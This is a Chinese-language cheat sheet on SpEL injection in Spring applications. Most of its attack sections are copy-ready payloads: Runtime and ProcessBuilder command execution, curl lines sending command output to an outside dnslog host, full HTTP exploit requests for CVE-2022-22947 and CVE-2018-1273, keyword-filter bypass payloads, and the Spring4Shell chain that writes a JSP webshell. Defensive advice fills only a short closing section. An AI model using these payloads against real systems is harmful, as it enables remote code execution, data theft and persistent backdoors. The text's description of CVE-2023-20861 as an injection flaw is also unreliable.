# Spring表达式(SPEL)注入

## 一句话理解
SpEL（Spring Expression Language）注入，是指用户输入进入 Spring 表达式解析器后被当成表达式执行，从而访问对象、调用方法、实例化类，最终可能实现敏感信息读取或远程代码执行。

## 基础理解
SpEL 是 Spring 提供的表达式语言，从 Spring 3 开始引入，能力远强于普通 EL。它可以：
- 访问属性
- 调用方法
- 执行条件表达式
- 引用 Bean
- 构造对象
- 调用静态方法

正因为能力强，若把用户输入直接交给 SpEL 解析，就很容易形成高危注入。

## 常见成因
- 直接把用户输入传给 `ExpressionParser.parseExpression()`
- 在数据绑定、注解配置、规则引擎中错误使用动态表达式
- 将不可信输入用于 `@Value`、路由规则、权限规则、模板表达式
- 自定义组件允许用户编辑 SpEL 规则

## 常见危害
- 读取应用配置
- 访问 Spring 容器中的 Bean
- 调用 Java 类和静态方法
- 命令执行
- 作为打穿 Spring 应用内部对象图的入口

## 常见利用方向
### 1. 基础表达式求值
先判断输入是否被当作 SpEL 解析。

### 2. 访问对象属性与方法
如果表达式上下文中对象可达，可继续访问其属性、调用方法。

### 3. 调用静态方法
SpEL 支持通过特定语法访问类和静态方法，这往往是高危点。

### 4. 构造对象与命令执行
一旦能触达 `Runtime`、`ProcessBuilder` 等类，风险会快速升高。

## 常用 Payload
### 1. 探针表达式（先确认输入被当作 SpEL 解析）
```java
7*7                                  // 直接求值场景：parseExpression 直接接收用户输入
#{7*7}                               // 模板场景：TemplateParserContext / 注解场景，回显 49 即确认
#{T(java.lang.Runtime)}              // 回显 "class java.lang.Runtime"，确认 T() 类型引用可用
#{T(java.lang.Thread).sleep(5000)}   // 响应延时 5 秒，无回显场景盲验证
```
判定技巧：
- 先试 `7*7` 再试 `#{7*7}`，哪种回显 49 就确定是哪种解析模式
- 无回显时用 `sleep` 延时或 DNS 外带判断
- `T(java.lang.Runtime)` 成功说明在用 `StandardEvaluationContext`（全功能上下文），后面四板斧都能打

### 2. 命令执行四板斧
```java
// 板斧一：Runtime 静态调用（最经典）
T(java.lang.Runtime).getRuntime().exec('whoami')

// 板斧二：ProcessBuilder 构造器（exec / Runtime 关键字被过滤时换用）
new java.lang.ProcessBuilder({'id'}).start()

// 板斧三：bash -c 外带验证（exec 不支持管道/反引号，必须交给 bash 解释）
T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','curl http://xxx.dnslog.cn/?r=`id`'})

// 板斧四：#this 借上下文对象（T()/new 被禁时，先借求值根对象摸清上下文再找路）
#this
#this.class
```
补充要点：
- `exec(String)` 按空格切分参数，不支持 `|`、`>`、反引号等 shell 特性，需 `bash -c`（Linux）或 `cmd /c`（Windows）包一层
- `exec` 本身无回显，返回的是 Process 对象。拿命令输出三种方式：
```java
// 方式一：读输出流直接回显（JDK 9+ 有 readAllBytes，需接口返回 getValue 结果）
new String(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'}).getInputStream().readAllBytes())

// 方式二：落盘后再用读文件 payload 查看
T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id > /tmp/out'})
new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/tmp/out')))

// 方式三：DNS/HTTP 外带（能出网时最省事）
T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','curl http://xxx.dnslog.cn/?r=`id`'})
```

### 3. 表达式定界符：`#{...}` 与 `${...}` 的区别
| 写法 | 名称 | 解析者 | 是否直接进 SpEL 解析器 |
|---|---|---|---|
| `#{...}` | SpEL 表达式定界符 | `SpelExpressionParser` | 是（内容原样交给 SpEL 即时求值） |
| `${...}` | 属性占位符 | `PropertySourcesPlaceholderConfigurer` | 否（只从环境变量/配置文件做字符串替换） |

要点：
- `@Value("#{...}")` 中的内容直接进 SpEL 解析器，一旦可控即 RCE
- `@Value("${...}")` 只是取配置值，里面写 `7*7` 不会被求值
- 二次注入点：`#{'${user.input}'}` 先做占位符替换、再进 SpEL 求值，占位符解析出的值会被二次执行
- Thymeleaf 等模板引擎中 `${...}` 的语义取决于方言（OGNL/SpEL），不能和 Spring 注解场景混为一谈

## 高危场景
- Spring 组件中自定义规则解析
- Spring Data、Spring Security 某些表达式场景
- 低代码平台、规则平台、工作流平台
- 后台“自定义表达式”功能

## 实战排查思路
### 1. 先找表达式解析入口
重点看：
- `SpelExpressionParser`
- `parseExpression`
- `Expression.getValue`
- 自定义 Spring 表达式执行逻辑

### 2. 再看输入是否用户可控
并不是所有 SpEL 都危险，关键在于：
- 用户能否控制表达式本身
- 用户能否影响表达式上下文对象

### 3. 再判断上下文能力
重点关注：
- 是否能访问 Spring Bean
- 是否能访问类加载器、运行时对象
- 是否能调用静态方法和构造器

### 4. 代码审计关键词速查表
| 关键词 | 含义 | 常见框架/场景 |
|---|---|---|
| `SpelExpressionParser` | SpEL 解析器实例化，一切注入的源头 | 自研规则引擎、Spring 内部（Security/Cache/WebFlow/Shell） |
| `parseExpression` | 表达式字符串 → Expression 对象 | 后台“自定义表达式”功能、报表、告警规则、低代码平台 |
| `getValue` | 触发求值（有回显则结果直接可见） | 与 parseExpression 成对出现，重点看表达式参数来源是否可控 |
| `StandardEvaluationContext` | 全功能上下文（T()/new/方法调用全开） | 缓存 key 计算、权限规则、任务调度表达式 |
| `SimpleEvaluationContext` | 受限上下文（默认禁 T()/new） | 官方推荐用于用户可控表达式，遇到它优先转向上下文对象分析 |
| `TemplateParserContext` | 模板模式（`#{...}` 定界符） | 模板消息、短信/邮件内容渲染 |
| `criteria` / `Sort` / `@Query` | Spring Data 查询/排序属性路径 | Spring Data REST、Repository（典型如 CVE-2018-1273） |
| `@Value` / `@Cacheable(key=...)` / `@PreAuthorize` | 注解内嵌 SpEL | 配置注入场景，用户输入不应流入这些注解表达式 |

## 真实组件案例
### 1. Spring Cloud Gateway — CVE-2022-22947（Actuator 路由 SpEL）
- 影响版本：Spring Cloud Gateway 3.1.0、3.0.0–3.0.6 及更早，且 Actuator 端点对外暴露
- 入口：`POST /actuator/gateway/routes/{id}` 注册恶意路由 → `POST /actuator/gateway/refresh` 刷新触发求值 → `GET /actuator/gateway/routes` 或访问该路由查看结果
- payload：
```http
POST /actuator/gateway/routes/pwn HTTP/1.1
Content-Type: application/json

{
  "id": "pwn",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "_genkey_0": "X-Result",
      "_genkey_1": "#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"
    }
  }],
  "uri": "http://example.com"
}
```
```java
// 想直接看命令输出，用读输出流版本，结果会写进响应头 X-Result
#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream().readAllBytes())}
```
- 成因一句话：路由 filter 参数值（如 AddResponseHeader 的 value）在路由刷新时被作为 SpEL 即时求值，Actuator 暴露让攻击者得以注册携带恶意表达式的路由。

### 2. Spring Data Commons — CVE-2018-1273（属性绑定 SpEL）
- 影响版本：Spring Data Commons 1.13–1.13.10、2.0–2.0.5 及更早
- 入口：基于 Spring Data REST / Repository 的表单绑定接口，攻击点在**参数名**（不是参数值）
- payload：
```http
POST /users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/pwned")]=pwn
```
- 成因一句话：把请求参数名映射到实体属性路径时，属性路径被交给 SpEL 解析器求值，参数名中的 `#this[...]` 表达式被执行。

### 3. CTF 风格例题：parseExpression + getValue 全过程
漏洞代码：
```java
@GetMapping("/eval")
public String eval(@RequestParam("exp") String exp) {
    SpelExpressionParser parser = new SpelExpressionParser();
    // 用户输入原样进解析器，getValue() 无参调用内部创建 StandardEvaluationContext —— 标准漏洞形态
    Expression expression = parser.parseExpression(exp);
    return String.valueOf(expression.getValue());
}
```
利用全过程：
```
# 第 1 步：探针，回显 49 确认是 SpEL
GET /eval?exp=7*7
→ 49

# 第 2 步：确认 T() 类型引用可用
GET /eval?exp=T(java.lang.Runtime)
→ class java.lang.Runtime

# 第 3 步：直接命令执行（无回显，只返回 Process 对象）
GET /eval?exp=T(java.lang.Runtime).getRuntime().exec('whoami')
→ java.lang.ProcessImpl@xxxxx

# 第 4 步：读文件回显 flag（CTF 最常用）
GET /eval?exp=new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))
→ flag{...}

# 第 5 步：需要命令输出时用 bash -c 外带
GET /eval?exp=T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','curl http://xxx.dnslog.cn/?r=`id`'})
```
- 成因一句话：用户输入未做任何校验直接进入 `parseExpression`，且 `getValue()` 默认使用全功能的 `StandardEvaluationContext`，T()/new/方法调用全部放行。

## 常见绕过思路
- 黑名单只过滤少数字符或关键类名
- 通过字符串拼接、对象间接访问规避关键字检测
- 利用现有上下文对象而非显式写危险类名

## 黑名单绕过 Payload
### 1. 字符串拼接绕过（过滤 Runtime/命令关键字）
思路：不出现敏感字符串，用 `T(java.lang.Character).toString()` 逐字符构造。`'whoami'` → w(119) h(104) o(111) a(97) m(109) i(105)
```java
// 逐字符构造 whoami 后执行，全程无敏感词（单行可直接复制）
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))

// char 数组构造字符串，更短
T(java.lang.Runtime).getRuntime().exec(new String(new char[]{119,104,111,97,109,105}))

// SpEL 支持字符串 + 拼接（过滤的是命令关键字而非类名时）
T(java.lang.Runtime).getRuntime().exec('who'+'ami')
```

### 2. 反射链绕过（过滤 T(java.lang.Runtime) 写法）
```java
// 通过空字符串的 class 对象反射加载 Runtime（SpEL 5.2.x 之前可用）
''.class.forName('java.lang.Runtime').getRuntime().exec('id')

// 等价写法
''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')

// T() 引用 java.lang.Class 再 forName（Runtime 关键字被过滤时用）
T(java.lang.Class).forName('java.lang.Runtime').getRuntime().exec('id')

// 类名同样可拼接
''.class.forName('java.lang.Runt'+'ime').getRuntime().exec('id')
```
版本说明：Spring 5.2.x 起 SpEL 对 `.class.forName` 反射链做了限制，新版本优先试 `T()` 直写与 ProcessBuilder，反射链作为老版本/绕过手段保留。

### 3. SimpleEvaluationContext vs StandardEvaluationContext
| 对比项 | StandardEvaluationContext | SimpleEvaluationContext |
|---|---|---|
| `T()` 类型引用 | 支持 | 禁用 |
| `new` 构造器 | 支持 | 禁用 |
| 普通方法调用 | 支持 | 禁用（仅属性绑定相关操作） |
| Bean 引用（`@bean`） | 支持 | 禁用 |
| 典型用途 | 框架内部/可信表达式 | 用户可控表达式（官方推荐） |

- 何时打不动：目标用 `SimpleEvaluationContext.forReadOnlyDataBinding()` / `forReadWriteDataBinding()` 创建上下文时，上述所有命令执行 payload（T()、new、反射链）全部失效，只能做属性读写
- 何时还有机会：
  - 上下文根对象（`#this`）本身带危险方法，或能沿对象图摸到可 RCE 的对象（Bean、ClassLoader 等）
  - 老版本实现有缺陷，如 CVE-2023-20861（Spring Framework 6.0.0–6.0.6，SpEL 解析存在注入缺陷，6.0.7 修复），SimpleEvaluationContext 也并非永远安全
- 审计意义：看到 `SimpleEvaluationContext` 说明开发者有意识防御，应转向上下文对象可达性分析而非硬套 payload

### 4. Spring4Shell（CVE-2022-22965）链简述
- 漏洞定位：不是 `#{}` 表达式注入，而是 Spring MVC 数据绑定 + ClassLoader 属性链的组合 RCE
- 触发条件（需全部满足）：
  - JDK 9+
  - Spring Framework 5.3.0–5.3.17 / 5.2.0–5.2.19 及更早
  - WAR 部署在 Tomcat 上（Spring Boot 内嵌容器场景难利用）
  - 存在 POJO 参数绑定的 Controller
- 成因：`CachedIntrospectionResults` 黑名单只阻断 `class.classLoader` 与 `class.protectionDomain`，JDK 9 引入 `class.module` 后，`class.module.classLoader` 绕过黑名单继续向下绑定
- 利用思路：借属性链改写 Tomcat `AccessLogValve` 配置（`class.module.classLoader.resources.context.parent.pipeline.first.*`），把访问日志写到 Web 根目录且内容可控（pattern 引用请求头），等于凭空落地一个 JSP 文件，再请求该 JSP 拿 shell
- 关键属性链：
```
# 第一步：POST 到任意含 POJO 绑定的接口，写 AccessLogValve 属性
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

# 第二步：带 c2 请求头访问任意路径，请求头内容即 JSP 代码，被写进日志
c2: <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

# 第三步：访问落地的 webshell
GET /tomcatwar.jsp?cmd=id
```

## 防御要点
### 1. 不解析不可信表达式
这是最根本的原则。

### 2. 只允许固定模板
若业务必须支持表达式，应限制为预定义、安全子集，而不是完整 SpEL。

### 3. 限制上下文对象
不要把容器、BeanFactory、运行时对象等高危对象暴露给表达式上下文。

### 4. 不依赖黑名单
仅过滤 `Runtime`、`ProcessBuilder` 这类关键字并不可靠。

## 速查清单
- 先搜 `SpelExpressionParser` 和 `parseExpression`
- 先判断用户是否能控制表达式本身
- 再判断表达式上下文中对象是否危险
- 关注 Spring 规则引擎、后台表达式配置、低代码平台
- 优先评估是否可转化为命令执行

## Reference
- https://paper.seebug.org/1694/
- https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/
- https://github.com/spring-projects/spring-framework/issues （Spring Framework Issue Tracker）
- https://www.lunasec.io/docs/blog/spring4shell/ （Spring4Shell 分析与复现）
- https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement （Spring4Shell 官方公告）
- https://spring.io/security （Spring 官方安全公告总入口）
- https://spring.io/security/cve-2022-22947 （Spring Cloud Gateway SpEL 注入）
- https://spring.io/security/cve-2022-22965 （Spring4Shell）
- https://spring.io/security/cve-2018-1273 （Spring Data Commons 属性绑定 RCE）
